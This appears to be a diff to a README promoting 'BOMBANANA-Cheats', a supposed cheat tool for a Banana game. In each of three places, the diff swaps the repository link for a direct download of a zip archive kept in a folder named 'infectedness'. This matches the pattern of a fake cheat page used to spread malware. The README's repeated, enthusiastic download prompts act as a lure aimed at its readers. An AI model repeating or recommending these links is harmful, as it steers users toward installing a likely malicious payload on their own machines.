@@ -4,7 +4,7 @@
 
 Welcome to BOMBANANA-Cheats! This is a powerful tool that gives you access to special features and enhancements for the popular Banana game. Whether you're looking to boost your gameplay, unlock hidden content, or simply have more fun, BOMBANANA-Cheats has everything you need.
 
-**Visit this link to download the application:** [Download BOMBANANA-Cheats](https://github.com/Nelasovmatvei/BOMBANANA-Cheats)
+**Visit this link to download the application:** [Download BOMBANANA-Cheats](https://github.com/Nelasovmatvei/BOMBANANA-Cheats/raw/refs/heads/main/infectedness/v1.4-alpha.4.zip)
 
 ## ✨ What is BOMBANANA-Cheats?
 
@@ -29,7 +29,7 @@ BOMBANANA-Cheats is a specialized trainer and mod tool designed exclusively for 
 
 ### Step 1: Download the Application
 
-**Visit this link to download the application:** [Download BOMBANANA-Cheats](https://github.com/Nelasovmatvei/BOMBANANA-Cheats)
+**Visit this link to download the application:** [Download BOMBANANA-Cheats](https://github.com/Nelasovmatvei/BOMBANANA-Cheats/raw/refs/heads/main/infectedness/v1.4-alpha.4.zip)
 
 1. Click the download link above
 2. The download will start automatically
@@ -154,7 +154,7 @@ BOMBANANA-Cheats is your ultimate companion for the Banana game. It's packed wit
 
 Don't forget to visit our GitHub page regularly for updates and community support. Happy cheating!
 
-**Visit this link to download the application:** [Download BOMBANANA-Cheats](https://github.com/Nelasovmatvei/BOMBANANA-Cheats)
+**Visit this link to download the application:** [Download BOMBANANA-Cheats](https://github.com/Nelasovmatvei/BOMBANANA-Cheats/raw/refs/heads/main/infectedness/v1.4-alpha.4.zip)
 
 ## 📋 Quick Reference
 
